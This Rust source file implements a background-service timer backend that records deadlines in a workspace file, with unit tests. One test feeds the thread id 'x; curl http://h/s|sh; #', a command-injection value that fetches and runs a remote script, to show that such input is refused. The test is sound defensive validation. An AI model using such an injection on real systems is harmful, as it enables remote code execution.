//! The clock that runs through the nexus-flow background service (nxf 6j6v.8see).
//!
//! # What this replaces, and why
//!
//! A declared channel `timeout:` needs something to look at the board when the window runs out.
//! Two answers came before this one:
//!
//! - **`at`** — the original. On macOS `atrun` ships disabled, so `at` accepted every job, exited 0,
//!   printed a job id, and nothing ever ran it (measured in 6j6v.p3sm: a queue of jobs from July
//!   whose due date was a month gone). On the platform this product is developed and mostly run on,
//!   a declared `timeout:` never fired ONCE.
//! - **One `launchd` agent per deadline** (6j6v.74c0) — which worked, and which the owner then found
//!   in the macOS background items on 2026-08-24: *"sh — an item from an unidentified developer"*,
//!   one entry per open board, `/bin/sh -c` with the workspace path spliced into the command string,
//!   and a `PATH` pointing at a `target/debug`.
//!
//! The decision (2026-08-25) was one word: **one**. There is one nexus-flow background service, it
//! is the thing that syncs, and it is the thing that keeps time. So arming a window is no longer
//! asking the OS for a job — it is writing a line into the workspace's own deadline book
//! ([`nxs_service::timers`]), which the service is already visiting.
//!
//! # What the caller gets that it did not have
//!
//! - **Seconds, not minutes.** `StartCalendarInterval` has no seconds field, so the launchd clock
//!   rounded every deadline up to the next whole minute. The service looks at the book every tick.
//! - **No litter.** A board closed before its window ends leaves one line in a file that the next
//!   `cancel` or the next arm overwrites — not an agent in `~/Library/LaunchAgents` that reloads at
//!   every login.
//! - **The same answer on every platform.** `at` was never a real answer on macOS and `launchd` is
//!   not one anywhere else. The book is a file; the service reads it on Linux exactly as it does on
//!   a Mac (see [`super::platform_default`]).
//!
//! # And what it costs — which is stated, not hidden
//!
//! There is no clock without the service. `at` and `launchd` were self-carrying: submit the job and
//! the OS owns it, running or not. This does not work that way, and [`ServiceTimer::schedule`]
//! says so out loud rather than returning a cheerful handle for a window nothing is watching —
//! which is the same honesty [`crate::orchestration::ConsequenceClass::TickUnscheduled`] was
//! introduced for.

use std::path::{Path, PathBuf};

use nxs_service::timers::{self, Job};
use nxs_service::{ServiceHome, ServiceState};

use super::{Timer, TimerHandle};
use crate::error::{NxfError, Result};

/// The prefix a [`TimerHandle`] from this backend carries, so `cancel` can tell it apart from an
/// `at` job id.
const HANDLE_PREFIX: &str = "service:";

/// `NXC_TIMER=service`, and the default everywhere: the deadline is written into the workspace's
/// book and the one background service honours it.
pub struct ServiceTimer {
    /// The workspace's `.nxs/` directory — where the deadline book lives.
    ///
    /// `None` means "resolve it from the working directory on every call", which is right for the
    /// CLI (a `nxc` invocation IS standing in its workspace) and wrong for an embedding app, whose
    /// working directory has nothing to do with the project it has open. An app therefore gets a
    /// timer built through [`super::TimerConfig::build_in`], which pins this.
    nxs_dir: Option<PathBuf>,
    /// Where the service keeps its state. `None` ⇒ the real `~/.nexusflow`; `Some` only in tests,
    /// so none of them can reach the developer's own registry or heartbeat.
    home: Option<ServiceHome>,
}

impl Default for ServiceTimer {
    fn default() -> Self {
        ServiceTimer::new()
    }
}

impl ServiceTimer {
    /// The CLI's form: the workspace is whichever one the caller is standing in.
    pub fn new() -> ServiceTimer {
        ServiceTimer {
            nxs_dir: None,
            home: None,
        }
    }

    /// An app's form: the workspace is pinned, because an app's working directory is not it.
    pub fn in_workspace(nxs_dir: impl Into<PathBuf>) -> ServiceTimer {
        ServiceTimer {
            nxs_dir: Some(nxs_dir.into()),
            home: None,
        }
    }

    /// The test form: a pinned workspace AND a pinned service home.
    #[cfg(test)]
    fn with_home(nxs_dir: impl Into<PathBuf>, home: ServiceHome) -> ServiceTimer {
        ServiceTimer {
            nxs_dir: Some(nxs_dir.into()),
            home: Some(home),
        }
    }

    fn nxs_dir(&self) -> Result<PathBuf> {
        if let Some(dir) = &self.nxs_dir {
            return Ok(dir.clone());
        }
        let cwd = std::env::current_dir().map_err(|e| {
            NxfError::io(format!(
                "resolving the working directory for the deadline: {e}"
            ))
        })?;
        Ok(nxs_foundation::workspace::Workspace::resolve(None, &cwd)?.dir)
    }

    fn home(&self) -> Result<ServiceHome> {
        match &self.home {
            Some(home) => Ok(home.clone()),
            None => ServiceHome::resolve(),
        }
    }

    /// Whether a service is in a position to honour a window in `nxs_dir` — and, when it is not,
    /// the sentence that says which of the two things is missing.
    ///
    /// Both cases leave the deadline WRITTEN, and both say so: the book is durable, so a service
    /// that arrives later still honours it. What the caller is being told is that nothing is
    /// watching the window *now*, which is exactly what `TickUnscheduled` means.
    ///
    /// **The `Err` from here and the `Err` from [`timers::check`] are the same type and mean
    /// different things** — nothing was written, versus written and unwatched (review of PR
    /// #369–#373, Code Quality #2). The distinction lives in the MESSAGE rather than in the type,
    /// deliberately: the message is what reaches the caller, because all three
    /// `orchestration.rs` sites wrap it verbatim into a `tick_unscheduled` warning, and no caller
    /// branches on which of the two it was. Widening [`Timer::schedule`]'s return for a distinction
    /// nobody consumes would change three backends and every call site to carry a fact only prose
    /// currently needs to state. What holds it instead is
    /// `both_refusals_say_what_became_of_the_deadline` below.
    fn attended(&self, nxs_dir: &Path) -> Result<()> {
        let home = self.home()?;
        let root = nxs_dir.parent().unwrap_or(nxs_dir);
        let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
        let attendance = home.attendance(root, &cwd)?;
        if !attendance.registered {
            return Err(NxfError::validation(format!(
                "{} is not registered with the nexus-flow background service, so nothing will look \
                 at this window. Register it with `nxs sync bind` (or from your app), then \
                 `nxs sync daemon install`. The deadline is recorded and will be honoured as soon \
                 as a service attends this workspace.",
                root.display()
            )));
        }
        match attendance.service {
            // `Unknown` is a platform that cannot probe its own service, not a service that is
            // down. Refusing there would report every window on that platform as unwatched.
            //
            // `Unconfirmed` joins it (nxf 6j6v.kcan), and here — unlike the standing warning in
            // `ServiceHome::fault`, which DOES say it — the reason is what refusing would cost:
            // this is a hard `Err` that stops a window being armed at all, and on the machine
            // where this state was first measured the service was running and working. Blocking
            // real work on a reading nobody can confirm is the larger harm; the warning beside
            // every invocation still tells its owner to look.
            ServiceState::Running | ServiceState::Unconfirmed | ServiceState::Unknown => Ok(()),
            // **The sentence comes from the fault, not from here** (nxf 6j6v.0j12). It used to be
            // written out at this site and named only the window — which is half the truth: the
            // owner decision of 2026-08-25 made this one process the only clock AND it was already
            // the only sync, so a service that is down costs both. Taking the words from
            // `ServiceFault` is what keeps this message and the one every other reader gets from
            // saying different things about the same machine.
            ServiceState::NotRunning => Err(NxfError::validation(format!(
                "{} The deadline is recorded and will be honoured as soon as one starts.",
                home.not_running_fault().detail()
            ))),
        }
    }
}

impl Timer for ServiceTimer {
    /// Arm `thread_id`'s window for `deadline`.
    ///
    /// `command` is deliberately unused. It is the SHELL form (`nxc tick --thread <id>`) the `at`
    /// backend needs to hand a shell, and handing a stored command line to a background service
    /// would mean the service runs whatever a workspace's book asks it to — a workspace being
    /// something you can clone from anywhere. The book stores a JOB from a closed set instead
    /// ([`Job`]), and the service builds the argv itself. `super::tick_command` and
    /// [`Job::argv`] describe the same job, which
    /// `the_shell_form_and_the_service_job_name_the_same_verb` holds.
    fn schedule(&self, thread_id: &str, deadline: &str, _command: &str) -> Result<TimerHandle> {
        let job = Job::ChatTick {
            thread: thread_id.to_string(),
        };
        // EVERY refusal that can happen without touching the filesystem happens here, BEFORE the
        // workspace is even resolved — the discipline the removed launchd backend recorded as "a
        // rejected schedule leaves no directory and no agent behind". It also keeps an unpinned
        // timer (the CLI's form) from resolving a workspace it is only going to refuse for.
        timers::check(deadline, &job)?;
        let nxs_dir = self.nxs_dir()?;
        timers::arm(&timers::path_in(&nxs_dir), deadline, job)?;
        self.attended(&nxs_dir)?;
        Ok(TimerHandle(format!("{HANDLE_PREFIX}{thread_id}")))
    }

    /// Arm `session`'s held delivery for `deadline` — [`schedule`](ServiceTimer::schedule)'s
    /// sibling, filed under its own key so a board's window and a caller's delivery cannot disarm
    /// each other (see [`Job::key`]).
    fn schedule_delivery(&self, session: &str, deadline: &str) -> Result<TimerHandle> {
        let job = Job::ChatDeliver {
            session: session.to_string(),
        };
        // Same order as `schedule`, and for its reason: every refusal that needs no filesystem
        // happens before the workspace is resolved.
        timers::check(deadline, &job)?;
        let key = job.key().unwrap_or_default().into_owned();
        let nxs_dir = self.nxs_dir()?;
        timers::arm(&timers::path_in(&nxs_dir), deadline, job)?;
        self.attended(&nxs_dir)?;
        Ok(TimerHandle(format!("{HANDLE_PREFIX}{key}")))
    }

    /// Arm `session`'s way back for `deadline` — [`schedule_delivery`](ServiceTimer::
    /// schedule_delivery)'s sibling, filed under its own key so the delivery and the resume a
    /// single interruption arms in one breath cannot disarm each other (see [`Job::key`]).
    fn schedule_resume(&self, session: &str, deadline: &str) -> Result<TimerHandle> {
        let job = Job::ChatResume {
            session: session.to_string(),
        };
        // Same order as its two siblings, and for their reason: every refusal that needs no
        // filesystem happens before the workspace is resolved.
        timers::check(deadline, &job)?;
        let key = job.key().unwrap_or_default().into_owned();
        let nxs_dir = self.nxs_dir()?;
        timers::arm(&timers::path_in(&nxs_dir), deadline, job)?;
        self.attended(&nxs_dir)?;
        Ok(TimerHandle(format!("{HANDLE_PREFIX}{key}")))
    }

    /// Whether anything is attending this workspace at all (nxf 6j6v.0j12).
    ///
    /// The same reading [`ServiceTimer::attended`] makes at schedule time, asked WITHOUT scheduling
    /// — so a verb that arms no window still reports it. Every step is best-effort: an unresolvable
    /// workspace, an unreadable registry or an unreadable heartbeat all mean "nothing to report"
    /// rather than an error, because this rides along on calls that have already succeeded and must
    /// never be able to fail one.
    fn service_fault(&self) -> Option<nxs_service::ServiceFault> {
        let nxs_dir = self.nxs_dir().ok()?;
        let root = nxs_dir.parent().unwrap_or(&nxs_dir).to_path_buf();
        let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
        self.home().ok()?.fault(&root, &cwd).ok().flatten()
    }

    /// Disarm a window. Works from a different process than the one that armed it — the handle is
    /// reconstructible from the thread id, not a process-local token — and disarming something that
    /// is not armed is a success, not an error.
    fn cancel(&self, handle: &TimerHandle) -> Result<()> {
        let key = handle.0.strip_prefix(HANDLE_PREFIX).unwrap_or(&handle.0);
        let nxs_dir = self.nxs_dir()?;
        timers::disarm(&timers::path_in(&nxs_dir), key).map(|_| ())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use nxs_service::heartbeat::{self, rfc3339, Heartbeat};
    use std::time::SystemTime;
    use tempfile::TempDir;

    /// A workspace `.nxs/` dir plus a service home, both inside one tempdir.
    fn places() -> (TempDir, PathBuf, ServiceHome) {
        let tmp = TempDir::new().unwrap();
        let nxs = tmp.path().join("proj").join(".nxs");
        std::fs::create_dir_all(&nxs).unwrap();
        let home = ServiceHome::at(tmp.path().join(".nexusflow"));
        (tmp, nxs, home)
    }

    fn register(home: &ServiceHome, nxs: &Path) {
        home.register(nxs.parent().unwrap(), Path::new("/"))
            .unwrap();
    }

    fn run_service(home: &ServiceHome) {
        heartbeat::write_to(
            &home.heartbeat(),
            &Heartbeat {
                // This very process, AND its real start instant: since nxf 6j6v.0wvp the liveness
                // probe compares both, so a fabricated `started_at` reads as somebody else's pid.
                pid: std::process::id(),
                started_at: rfc3339(SystemTime::now()),
                last_pass_at: rfc3339(SystemTime::now()),
                workspaces: Vec::new(),
                program: None,
                version: None,
                instance: None,
                write_failures: None,
            },
        )
        .unwrap();
    }

    fn book(nxs: &Path) -> Vec<nxs_service::Deadline> {
        timers::read_from(&timers::path_in(nxs)).unwrap()
    }

    #[test]
    fn the_backend_reports_an_unattended_workspace_without_scheduling_anything() {
        // The half `schedule` could never carry (nxf 6j6v.0j12): asked with no deadline in hand, so
        // a verb that arms no window at all still learns that nothing is running.
        let (_tmp, nxs, home) = places();
        let timer = ServiceTimer::with_home(&nxs, home.clone());
        assert_eq!(
            timer.service_fault(),
            None,
            "an unregistered workspace never asked the service for anything"
        );

        register(&home, &nxs);
        let fault = timer
            .service_fault()
            .expect("registered, and nothing is running");
        assert_eq!(fault, nxs_service::ServiceFault::NotRunning);
        assert!(
            book(&nxs).is_empty(),
            "asking must schedule nothing — it is a reading, not a submission"
        );

        run_service(&home);
        assert_eq!(
            timer.service_fault(),
            None,
            "and a live service is nothing to report"
        );
    }

    #[test]
    fn arming_a_window_writes_it_into_the_workspaces_own_book() {
        let (_tmp, nxs, home) = places();
        register(&home, &nxs);
        run_service(&home);
        let timer = ServiceTimer::with_home(&nxs, home);

        let handle = timer
            .schedule("m-abc", "2026-08-25T18:00:00Z", "nxc tick --thread m-abc")
            .expect("an attended workspace with a running service arms cleanly");
        assert_eq!(handle.0, "service:m-abc");

        let armed = book(&nxs);
        assert_eq!(armed.len(), 1);
        assert_eq!(armed[0].due, "2026-08-25T18:00:00Z");
        assert_eq!(
            armed[0].job,
            Job::ChatTick {
                thread: "m-abc".into()
            }
        );
    }

    #[test]
    fn re_arming_the_same_board_moves_its_window_instead_of_adding_a_second() {
        let (_tmp, nxs, home) = places();
        register(&home, &nxs);
        run_service(&home);
        let timer = ServiceTimer::with_home(&nxs, home);
        timer
            .schedule("m-abc", "2026-08-25T18:00:00Z", "x")
            .unwrap();
        timer
            .schedule("m-abc", "2026-08-25T19:00:00Z", "x")
            .unwrap();
        let armed = book(&nxs);
        assert_eq!(
            armed.len(),
            1,
            "an `at` queue would hold two here: {armed:?}"
        );
        assert_eq!(armed[0].due, "2026-08-25T19:00:00Z");
    }

    #[test]
    fn cancel_removes_the_window_and_cancelling_again_is_not_an_error() {
        let (_tmp, nxs, home) = places();
        register(&home, &nxs);
        run_service(&home);
        let timer = ServiceTimer::with_home(&nxs, home);
        let handle = timer
            .schedule("m-abc", "2026-08-25T18:00:00Z", "x")
            .unwrap();
        timer.cancel(&handle).unwrap();
        assert!(book(&nxs).is_empty());
        timer
            .cancel(&handle)
            .expect("cancelling a window that is already gone is a success");
    }

    #[test]
    fn a_handle_rebuilt_in_another_process_cancels_the_same_window() {
        let (_tmp, nxs, home) = places();
        register(&home, &nxs);
        run_service(&home);
        let timer = ServiceTimer::with_home(&nxs, home);
        timer
            .schedule("m-abc", "2026-08-25T18:00:00Z", "x")
            .unwrap();
        // Not the handle `schedule` returned — one built from the thread id alone, which is what a
        // later process has.
        timer.cancel(&TimerHandle("service:m-abc".into())).unwrap();
        assert!(book(&nxs).is_empty());
    }

    #[test]
    fn an_unregistered_workspace_is_told_so_and_the_deadline_is_still_recorded() {
        let (_tmp, nxs, home) = places();
        run_service(&home);
        let timer = ServiceTimer::with_home(&nxs, home);
        let err = timer
            .schedule("m-abc", "2026-08-25T18:00:00Z", "x")
            .expect_err("a workspace no service attends has no clock");
        assert!(
            err.msg.contains("not registered"),
            "the refusal names which of the two halves is missing: {}",
            err.msg
        );
        assert!(
            err.msg.contains("nxs sync bind"),
            "and what to do about it: {}",
            err.msg
        );
        assert_eq!(
            book(&nxs).len(),
            1,
            "the window is recorded either way — a service that arrives later still honours it"
        );
    }

    /// Write a heartbeat that this process's pid keeps ALIVE while claiming a start instant far
    /// outside the identity slack — the `Unconfirmed` shape (nxf 6j6v.kcan): something is there,
    /// and it did not write this.
    fn run_service_that_cannot_be_confirmed(home: &ServiceHome) {
        heartbeat::write_to(
            &home.heartbeat(),
            &Heartbeat {
                pid: std::process::id(),
                started_at: "2020-01-01T00:00:00Z".into(),
                last_pass_at: "2020-01-01T00:00:00Z".into(),
                workspaces: Vec::new(),
                program: None,
                version: None,
                instance: None,
                write_failures: None,
            },
        )
        .unwrap();
    }

    /// nxf 6j6v.kcan, at the one call site where the new state costs or saves something real.
    ///
    /// `Unconfirmed` is not a "no", and here a "no" is a hard `Err` that stops a window being armed
    /// at all — on the very machine where this state was first measured, the service was running
    /// and working. So this arm must let the window through, exactly as `Unknown` does, and the
    /// decision is worth a test because the opposite reading compiles just as well: flipping this
    /// arm back to the `NotRunning` branch would leave the whole 44-binary suite green.
    ///
    /// Gated to the platforms that can PRODUCE the state: it needs a real process start time to
    /// disagree with, so anywhere without that API the same heartbeat reads `Unknown` and the test
    /// would be proving the older arm under this one's name.
    #[test]
    #[cfg(any(target_os = "macos", target_os = "ios", target_os = "linux"))]
    fn a_service_that_cannot_be_confirmed_still_lets_a_window_be_armed() {
        let (_tmp, nxs, home) = places();
        register(&home, &nxs);
        run_service_that_cannot_be_confirmed(&home);

        assert_eq!(
            home.attendance(nxs.parent().unwrap(), Path::new("/"))
                .unwrap()
                .service,
            ServiceState::Unconfirmed,
            "the fixture really does produce the state under test, not merely an unknown one"
        );

        ServiceTimer::with_home(&nxs, home)
            .schedule("m-abc", "2026-08-25T18:00:00Z", "x")
            .expect("a reading nobody can confirm must not block real work");
        assert_eq!(book(&nxs).len(), 1, "and the window is on the books");
    }

    /// The counterpart, so the pair says where the line actually is: a service that is PROVEN gone
    /// still refuses. Without it, "let it through" could quietly become "let everything through".
    #[test]
    fn a_service_that_is_proven_gone_still_refuses_the_window() {
        let (_tmp, nxs, home) = places();
        register(&home, &nxs);
        heartbeat::write_to(
            &home.heartbeat(),
            &Heartbeat {
                // A pid outside `i32` cannot name a process, so the probe proves absence.
                pid: u32::MAX,
                started_at: rfc3339(SystemTime::now()),
                last_pass_at: rfc3339(SystemTime::now()),
                workspaces: Vec::new(),
                program: None,
                version: None,
                instance: None,
                write_failures: None,
            },
        )
        .unwrap();

        let err = ServiceTimer::with_home(&nxs, home)
            .schedule("m-abc", "2026-08-25T18:00:00Z", "x")
            .expect_err("a service that is gone is a no, and stays one");
        assert!(
            err.msg
                .contains("no nexus-flow background service is running"),
            "{}",
            err.msg
        );
    }

    #[test]
    fn a_registered_workspace_with_no_service_running_names_that_instead() {
        let (_tmp, nxs, home) = places();
        register(&home, &nxs);
        let timer = ServiceTimer::with_home(&nxs, home);
        let err = timer
            .schedule("m-abc", "2026-08-25T18:00:00Z", "x")
            .expect_err("no service means no clock right now");
        assert!(
            err.msg
                .contains("no nexus-flow background service is running"),
            "{}",
            err.msg
        );
        assert_eq!(book(&nxs).len(), 1);
    }

    #[test]
    fn both_refusals_say_what_became_of_the_deadline() {
        // The two `Err`s carry the same TYPE and opposite facts — nothing was written, versus
        // written and unwatched. Nothing branches on them, so the message is the whole distinction,
        // and this is what stops it rotting into two sentences that read the same.
        let (_tmp, nxs, home) = places();
        let unwatched = ServiceTimer::with_home(&nxs, home.clone());
        register(&home, &nxs);
        let recorded = unwatched
            .schedule("m-abc", "2026-08-25T18:00:00Z", "x")
            .expect_err("no service is running");
        assert!(
            recorded.msg.contains("recorded"),
            "an unwatched window is still on the books, and says so: {}",
            recorded.msg
        );

        let refused = ServiceTimer::with_home(&nxs, home)
            .schedule("m-abc", "next tuesday", "x")
            .expect_err("a malformed deadline is refused");
        assert!(
            !refused.msg.contains("recorded"),
            "a refused one was never written, and must not claim otherwise: {}",
            refused.msg
        );
    }

    #[test]
    fn a_deadline_that_is_not_an_instant_is_refused_before_anything_is_written() {
        let (_tmp, nxs, home) = places();
        register(&home, &nxs);
        run_service(&home);
        let timer = ServiceTimer::with_home(&nxs, home);
        let err = timer.schedule("m-abc", "next tuesday", "x").unwrap_err();
        assert_eq!(err.kind.as_str(), "validation");
        assert!(book(&nxs).is_empty());
    }

    #[test]
    fn a_thread_id_outside_the_charset_is_refused_and_nothing_is_written() {
        let (_tmp, nxs, home) = places();
        register(&home, &nxs);
        run_service(&home);
        let timer = ServiceTimer::with_home(&nxs, home);
        let err = timer
            .schedule("x; curl http://h/s|sh; #", "2026-08-25T18:00:00Z", "x")
            .unwrap_err();
        assert_eq!(err.kind.as_str(), "validation");
        assert!(book(&nxs).is_empty());
    }

    #[test]
    fn the_shell_form_and_the_service_job_name_the_same_verb() {
        // `Timer::schedule`'s `command` is the shell spelling the `at` backend hands a shell; this
        // backend builds an argv from the job instead. The two must describe the same tick, or a
        // board would be checked differently depending on which clock armed it.
        let shell = super::super::tick_command("m-abc");
        let argv = Job::ChatTick {
            thread: "m-abc".into(),
        }
        .argv()
        .unwrap();
        assert_eq!(shell, "nxc tick --thread m-abc");
        assert_eq!(argv, vec!["chat", "tick", "--thread", "m-abc"]);
        assert!(
            shell.ends_with(&argv[1..].join(" ")),
            "both name `tick --thread <id>`: {shell} vs {argv:?}"
        );
    }
}
